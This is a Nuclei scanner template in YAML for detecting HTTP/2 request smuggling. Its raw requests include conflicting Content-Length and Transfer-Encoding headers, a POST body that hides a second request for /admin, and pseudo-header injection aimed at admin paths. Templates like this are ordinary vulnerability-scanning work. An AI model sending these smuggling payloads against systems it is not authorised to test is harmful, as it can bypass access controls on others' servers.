http:
- extractors:
  - part: header
    regex:
    - X-HTTP2-Stream-ID:\s*(\d+)
    - X-HTTP2-Stream-Weight:\s*(\d+)
    type: regex
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - HTTP/2
    - stream error
    - protocol error
    - SETTINGS_ENABLE_PUSH
  - part: header
    regex:
    - 'X-HTTP2-Stream-\w+:'
    - X-Forwarded-Proto:\s*h2
    type: regex
  - condition: and
    dsl:
    - contains(tolower(all_headers), 'http/2')
    - status_code == 400 || status_code == 421 || status_code == 505
    type: dsl
  matchers-condition: or
  raw:
  - 'PRI * HTTP/2.0


    SM

    '
  - 'GET /test HTTP/2

    Host: {{Hostname}}

    Transfer-Encoding: chunked

    Content-Length: 0

    '
  - 'GET /admin HTTP/2

    Host: {{Hostname}}

    X-HTTP2-Settings: AAMAAABkAAQAoAAAAAIAAAAA

    X-HTTP2-Stream-ID: 1

    X-HTTP2-Stream-Weight: 256

    '
  - 'POST /search HTTP/2

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 13

    Transfer-Encoding: chunked


    0


    GET /admin HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET / HTTP/2

    Host: {{Hostname}}

    :method: GET

    :path: /admin

    :scheme: https

    :authority: {{Hostname}}

    '
  unsafe: true
id: http2-request-smuggling
info:
  author: geeknik
  classification:
    cwe-id: CWE-444
  description: 'Detects HTTP/2 request smuggling vulnerabilities through various techniques
    including

    header injection, stream manipulation, and protocol downgrade attacks.

    '
  metadata:
    max-request: 5
  name: HTTP/2 Request Smuggling Detection
  reference:
  - https://portswigger.net/research/http2
  - https://www.blackhat.com/us-21/briefings/schedule/#http2-the-sequel-is-always-worse-22668
  severity: high
  tags: http2,smuggling,desync,critical
